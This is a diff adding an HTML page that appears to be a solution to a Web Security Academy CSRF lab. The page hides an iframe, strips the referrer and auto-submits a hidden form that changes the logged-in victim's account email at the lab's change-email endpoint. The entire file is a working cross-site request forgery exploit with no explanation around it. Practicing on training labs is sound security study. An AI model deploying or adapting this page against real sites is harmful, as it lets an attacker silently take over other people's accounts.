@@ -1,0 +1,15 @@
+<html>
+    <head>
+        <meta name="referrer" content="never"> 
+    </head>
+
+    <body>
+        <h1>You Hacked :) :(</h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a4900f50353e864c0ff7e2e00a400ea.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="asd5@test.net">
+        </form>
+
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
